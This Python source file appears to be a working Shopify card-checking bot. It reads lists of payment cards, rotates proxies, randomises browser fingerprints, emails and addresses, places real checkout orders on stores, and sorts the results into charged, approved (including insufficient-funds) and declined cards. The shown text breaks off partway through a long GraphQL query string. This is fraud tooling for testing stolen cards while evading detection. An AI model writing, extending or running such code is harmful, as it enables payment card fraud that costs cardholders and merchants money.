            _, pci_body = send_pci_session(
                ident_sig, card_number, card_name_str,
                card_month, card_year, card_cvv,
                vault_domain, proxy_url,
                vault_url=vault_url, vault_domain=vault_domain)
            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                _fallback = ("https://checkout.pci.shopifycs.com/sessions"
                             if "shopifyinc" in (vault_url or "")
                             else "https://checkout.pci.shopifyinc.com/sessions")
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name_str,
                    card_month, card_year, card_cvv,
                    site_name, proxy_url, vault_url=_fallback)
                pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                raise Exception(f"could not extract session ID (body: {pci_body[:120]})")
        except Exception as e:
            result.error = Exception(f"Step 9 failed: {e}")
            return result

        # ── Step 10: Submit ───────────────────────────────────────────
        try:
            is_digital = not extract_is_shipping_required(final_proposal_body)
            print(f"  Product type: {'DIGITAL' if is_digital else 'PHYSICAL'}")

            delivery_handle = extract_delivery_handle(final_proposal_body)
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("could not extract delivery handle")

            signed_handles = extract_signed_handles(final_proposal_body)
            if len(signed_handles) == 0 and not is_digital:
                result.retryable = True
                raise Exception("could not extract signedHandles")

            shipping_amount = extract_shipping_amount(final_proposal_body)
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("could not extract shipping amount")
            if not shipping_amount:
                shipping_amount = "0.00"

            total_amount = (extract_checkout_total(final_proposal_body)
                            or extract_seller_total(final_proposal_body)
                            or (extract_running_total(final_proposal_body) if is_digital else ""))
            if not total_amount:
                raise Exception("could not extract total amount")
            result.amount = total_amount

            attempt_token = generate_attempt_token(checkout_token)
            current_tax   = extract_tax_amount(final_proposal_body)
            current_total = total_amount

            MAX_TAX_RETRIES = 3
            for tax_attempt in range(1, MAX_TAX_RETRIES + 1):
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token,
                    final_queue_token, email, addr, delivery_handle, shipping_amount, current_total,
                    pci_session_id, attempt_token, currency, country, signed_handles,
                    is_digital=is_digital,
                    tax_amount=current_tax
                )

                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    print(f"  <tg-emoji emoji-id='4922679553744176307'>⚠️</tg-emoji>  Tax changed, retrying ({tax_attempt}/{MAX_TAX_RETRIES})")
                    new_tax   = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    if tax_attempt == MAX_TAX_RETRIES:
                        raise Exception("tax kept changing after 3 retries")
                    time.sleep(0.05)
                    continue

                break  # clean exit

            check_submit_errors(submit_status, submit_body)

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                error_msg = extract_any_error(submit_body)
                if "CAPTCHA" in (error_msg or ""):
                    error_msg = "CARD_DECLINED"
                if error_msg:
                    print(f"  Submit Error: {error_msg}")
                    result.status      = CheckStatus.DECLINED
                    result.status_code = error_msg
                    result.error       = Exception(error_msg)
                    result.retryable   = any(k in error_msg.lower() for k in ['inventory','retry','try again','generic'])
                else:
                    result.retryable = True
                    result.error = Exception("could not extract receiptId or error message")
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("could not extract sessionToken")

        except Exception as e:
            result.error = e
            return result

    except Exception as e:
        result.error = e

    return result

def load_card_entries(file_path: str) -> List[str]:
    with open(file_path, 'r') as f:
        card_data = f.read()
    
    raw_lines = card_data.replace('\r\n', '\n').split('\n')
    entries = []
    for raw_line in raw_lines:
        line = raw_line.strip()
        if line:
            entries.append(line)
    
    if len(entries) == 0:
        raise Exception(f"no card entries found in {file_path}")
    return entries

def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    card_parts = card_entry.strip().split('|')
    if len(card_parts) != 4:
        raise Exception(f"invalid card format in file: {card_entry}")
    
    try:
        card_month = int(card_parts[1])
        card_year = int(card_parts[2])
    except ValueError as e:
        raise Exception(f"invalid card month/year in file: {e}")
    
    return card_parts[0], card_month, card_year, card_parts[3]

def load_proxy_entries(file_path: str) -> List[str]:
    with open(file_path, 'r') as f:
        data = f.read()
    
    lines = data.split('\n')
    entries = []
    for line in lines:
        line = line.strip()
        if line and not line.startswith('#'):
            entries.append(line)
    
    if len(entries) == 0:
        raise Exception(f"no proxy entries found in {file_path}")
    
    return entries

# ─── BASE64URL PROXY CREDENTIAL DECODER (merged from shop.py) ────────
# Shopify proxy lists often arrive with base64url-encoded user/pass
# (e.g. from dashboard exports).  Without decoding them the HTTP tunnel
# auth fails silently.  _is_base64url detects the encoding; _decode_base64url
# fixes it.  normalize_proxy now applies both before constructing the URL.

def _is_base64url(s: str) -> bool:
    """
    True if *s* looks like a base64url-encoded credential.
    base64url alphabet: A-Z a-z 0-9 - _  optional = padding.
    Minimum length of 16 guards against plain short passwords like "abc".
    """
    if len(s) < 16:
        return False
    return bool(re.fullmatch(r'[A-Za-z0-9\-_]+=*', s))

def _decode_base64url(s: str) -> str:
    """Decode a base64url string; returns *s* unchanged on any failure."""
    import base64 as _b64
    try:
        b = s.replace('-', '+').replace('_', '/')
        b += '=' * ((4 - len(b) % 4) % 4)
        return _b64.b64decode(b).decode('utf-8', errors='replace')
    except Exception:
        return s

def normalize_proxy(raw: str) -> str:
    """
    Normalize a proxy string into a URL that aiohttp / curl_cffi accept.

    Supported input formats
    -----------------------
    ip:port                          → http://ip:port
    ip:port:user:pass (plain text)   → http://user:pass@ip:port
    ip:port:b64user:b64pass          → decoded then same as above
    socks5://ip:port                 → unchanged
    http://user:pass@ip:port         → unchanged
    """
    p = raw.strip()
    if not p:
        raise Exception("empty proxy")

    # Already a full URL → validate and return
    if '://' in p:
        parsed = urllib.parse.urlparse(p)
        if not parsed.netloc:
            raise Exception(f"invalid proxy URL: {raw}")
        return p

    parts = p.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        # Decode base64url-encoded credentials if present
        if _is_base64url(user):
            user = _decode_base64url(user)
        if _is_base64url(pwd):
            pwd  = _decode_base64url(pwd)
        return f"http://{user}:{pwd}@{ip}:{port}"

    if len(parts) == 2:
        return f"http://{p}"

    raise Exception(f"unrecognised proxy format: {raw!r}")

def test_proxy(proxy_url: str) -> bool:
    try:
        session = requests.Session()
        session.proxies = {'http': proxy_url, 'https': proxy_url}
        resp = session.get("https://api.ipify.org?format=json", timeout=10)
        if resp.status_code == 200 and resp.text.strip():
            return True
    except Exception as e:
        print(f"  Proxy test failed: {e}")
    return False

def find_working_proxies(proxies: List[str]) -> List[str]:
    working = []
    seen = set()
    
    for i, raw in enumerate(proxies):
        try:
            proxy_url = normalize_proxy(raw)
        except Exception as e:
            print(f"[Proxy {i+1}/{len(proxies)}] Invalid entry skipped: {e}")
            continue
        
        if proxy_url in seen:
            print(f"[Proxy {i+1}/{len(proxies)}] Duplicate skipped: {proxy_url}")
            continue
        
        print(f"[Proxy {i+1}/{len(proxies)}] Testing {proxy_url}")
        if test_proxy(proxy_url):
            seen.add(proxy_url)
            working.append(proxy_url)
            print(f"[Proxy {i+1}/{len(proxies)}] OK, added to rotation.")
        else:
            print(f"[Proxy {i+1}/{len(proxies)}] Failed")
    
    if len(working) == 0:
        raise Exception("no working proxy found")
    
    return working

def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    """Enhanced version with random browser fingerprints and addresses"""
    currency = "USD"
    country = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")
    
    result = CheckResult(
        card=card_entry,
        shop_url=shop_url,
        site_name=site_name,
        currency=currency,
        status=CheckStatus.ERROR
    )
    
    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result
    
    # Generate random email for this checkout
    email = generate_random_email()
    print(f"  Using email: {email}")
    
    # Random browser fingerprint for each attempt
    impersonate = random.choice(BROWSER_PROFILES)
    user_agent = random.choice(USER_AGENTS)
    print(f"  Browser fingerprint: {impersonate}")
    
    # Create TLS client with curl_cffi
    client = TLSClient(timeout=30, proxy_url=proxy_url,
                       impersonate=impersonate, user_agent=user_agent)
    
    try:
        # Step 0 - Find cheapest product
        try:
            title, product_id, variant_id, price = find_cheapest_product(client, shop_url)
            print(f"  Found product: {title} - ${price}")
            result.amount = price  # capture product price early so it always appears in result
            _ = title, product_id
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result
        
        # Step 1 - Add to cart and get checkout
        try:
            checkout_url, checkout_token, session_token, checkout_html = add_to_cart_and_checkout(client, shop_url, variant_id)
            stable_id = extract_stable_id(checkout_html)
            build_id = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 1 failed: {e}")
            return result
        
        # Step 2 - Get private access token
        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 2 failed: {e}")
            return result
        
        # Step 3 - Get actions JS and extract IDs
        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("could not find actions JS URL")
            js_body = fetch_actions_js(client, actions_url, shop_url)
            proposal_id = extract_proposal_id(js_body)
            submit_id = extract_submit_for_completion_id(js_body)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result
        
        # Step 4 - First proposal
        try:
            _, proposal_body = send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
                                              stable_id, variant_id, price, proposal_id, build_id, source_token,
                                              currency, country)
            
            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency
            
            if currency == "USD":
                seller_price = extract_seller_merchandise_price(proposal_body)
                if seller_price and seller_price != price:
                    price = seller_price
            
            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 4 failed: {e}")
            return result
        
        # Step 5 - Second proposal with email
        try:
            _, proposal2_body = send_proposal2(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token, email, currency, country)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 5 failed: {e}")
            return result
        
        # Step 6 - Third proposal with address
        try:
            addr = address_for_country(country)
            print(f"  Using address: {addr.city}, {addr.country_code}")
            _, proposal3_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token2, email, addr, currency, country)
            queue_token3 = extract_queue_token(proposal3_body)
            if not queue_token3:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 6 failed: {e}")
            return result
        
        # Step 7 - Fourth proposal (repeat)
        time.sleep(0.05)
        try:
            _, proposal4_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token3, email, addr, currency, country)
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 7 failed: {e}")
            return result
        
        # Step 8 - Fifth proposal
        time.sleep(0.05)
        try:
            proposal5_status, proposal5_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                               stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                               queue_token4, email, addr, currency, country)
            _ = proposal5_status
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 8 failed: {e}")
            return result
        
        # Step 9 - PCI Session
        try:
            ident_sig    = extract_identification_signature(checkout_html)
            vault_url    = extract_vault_url(checkout_html)
            vault_domain = extract_vault_domain(checkout_html) or site_name
            if not ident_sig:
                raise Exception("could not extract identification signature")
            card_name_str = f"{addr.first_name} {addr.last_name}"
            _, pci_body = send_pci_session(
                ident_sig, card_number, card_name_str,
                card_month, card_year, card_cvv,
                vault_domain, proxy_url,
                vault_url=vault_url, vault_domain=vault_domain)
            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                _fallback = ("https://checkout.pci.shopifycs.com/sessions"
                             if "shopifyinc" in (vault_url or "")
                             else "https://checkout.pci.shopifyinc.com/sessions")
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name_str,
                    card_month, card_year, card_cvv,
                    site_name, proxy_url, vault_url=_fallback)
                pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                raise Exception(f"could not extract session ID (body: {pci_body[:120]})")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 9 failed: {e}")
            return result
        
        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("could not extract queueToken")

            # ── Detect digital vs physical from proposal5 response ──
            is_digital = not extract_is_shipping_required(proposal5_body)
            print(f"  Product type: {'DIGITAL' if is_digital else 'PHYSICAL'}")

            delivery_handle = extract_delivery_handle(proposal5_body)
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract delivery handle")

            signed_handles = extract_signed_handles(proposal5_body)
            if len(signed_handles) == 0 and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract signedHandles")

            shipping_amount = extract_shipping_amount(proposal5_body)
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract shipping amount")
            if not shipping_amount:
                shipping_amount = "0.00"  # digital products have no shipping

            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount and is_digital:
                total_amount = extract_running_total(proposal5_body)  # digital uses runningTotal
            if not total_amount:
                raise Exception("Step 10 failed: could not extract total amount")
            result.amount = total_amount

            attempt_token = generate_attempt_token(checkout_token)
            
            current_tax    = extract_tax_amount(proposal5_body)
            current_total  = total_amount
            
            MAX_TAX_RETRIES = 3
            for tax_attempt in range(1, MAX_TAX_RETRIES + 1):
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token, queue_token5, email,
                    addr, delivery_handle, shipping_amount, current_total,
                    pci_session_id, attempt_token, currency, country, signed_handles,
                    is_digital=is_digital,
                    tax_amount=current_tax
                )
                
                # Check for tax change rejection specifically
                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    print(f"  <tg-emoji emoji-id='4922679553744176307'>⚠️</tg-emoji>  Tax changed, retrying with new tax (attempt {tax_attempt}/{MAX_TAX_RETRIES})")
                    new_tax   = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    time.sleep(0.05)
                    continue
                
                # No tax error — break and proceed normally
                break
            _ = submit_status
            check_submit_errors(submit_status, submit_body)

            receipt_id = extract_receipt_id(submit_body)

            if not receipt_id:
                error_msg = extract_any_error(submit_body)
                if "CAPTCHA" in (error_msg or ""):
                    error_msg = "CARD_DECLINED"
                if error_msg:
                    print(f"  Submit Error: {error_msg}")
                    result.status = CheckStatus.DECLINED
                    result.status_code = error_msg
                    result.error = Exception(error_msg)
                    result.retryable = any(keyword in error_msg.lower() for keyword in ['inventory', 'retry', 'try again', 'generic'])
                else:
                    result.status = CheckStatus.ERROR
                    result.error = Exception("Step 10 failed: could not extract receiptId or error message")
                    result.retryable = True
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("Step 10 failed: could not extract sessionToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            return result
        
        # Step 11 - Poll for receipt
        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
        
        for poll_num in range(1, 6):
            try:
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token
                )
                
                receipt_type = ""
                match = type_name_re.search(poll_body)
                if match:
                    receipt_type = match.group(1)
                
                status_code = extract_receipt_status_code(poll_body, receipt_type)
                result.status_code = status_code
                
                if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
                    print(f"  Poll {poll_num}: SUCCESS! Order placed!")
                    result.status      = CheckStatus.CHARGED
                    result.status_code = "ORDER_PLACED"
                    try:
                        poll_json   = json.loads(poll_body)
                        receipt_obj = poll_json.get("data", {}).get("receipt", {})
                        conf_url    = receipt_obj.get("confirmationPage", {}).get("url", "")
                        result.receipt_url = conf_url or checkout_url
                    except Exception:
                        result.receipt_url = checkout_url
                    return result
                
                if receipt_type == "ActionRequiredReceipt":
                    print(f"  Poll {poll_num}: 3DS_AUTHENTICATION")
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_AUTHENTICATION"
                    return result
                
                if receipt_type == "FailedReceipt":
                    error_code = ""
                    error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
                    match = error_re.search(poll_body)
                    if match:
                        error_code = match.group(1)
                    if "CAPTCHA" in error_code:
                        error_code = "CARD_DECLINED"
                    
                    if error_code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                        return result
                    elif error_code == "CARD_DECLINED":
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"{error_code}")
                        return result
                    elif error_code == "GENERIC_ERROR":
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error = Exception("CARD_DECLINED")
                        return result
                    else:
                        if "InventoryReservationFailure" in poll_body:
                            result.status = CheckStatus.ERROR
                            result.retryable = True
                            return result
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"{error_code}")
                        return result
                
                delay = 500
                match = poll_delay_re.search(poll_body)
                if match:
                    try:
                        d = int(match.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                time.sleep(min(delay, 300) / 1000.0)
                
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"poll {poll_num} failed: {e}")
                return result
        
        result.status = CheckStatus.ERROR
        result.error = Exception("exceeded poll attempts")
        return result
        
    finally:
        client.close()




# =============================================================================
#  ASYNC SHOPIFY ENGINE  (merged from shop.py — no curl_cffi required)
# =============================================================================
#
#  run_checkout_for_card_async() is a full async rewrite of the checkout
#  flow using aiohttp + inline GraphQL strings (no JS-bundle scraping).
#  check_card_with_retry() now calls this directly (no asyncio.to_thread).
#
#  The four constants below are verbatim GraphQL documents from shop.py.
#  They target the /checkouts/unstable/graphql endpoint which Shopify
#  exposes for all stores — unlike the persisted-query endpoint used by
#  the curl_cffi engine, these inline queries need no JS fetch to obtain
#  their hash IDs.
# =============================================================================

import aiohttp as _aiohttp  # noqa: re-import is fine if already imported at top

# ── GraphQL document: shipping proposal ──────────────────────────────────────
QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval 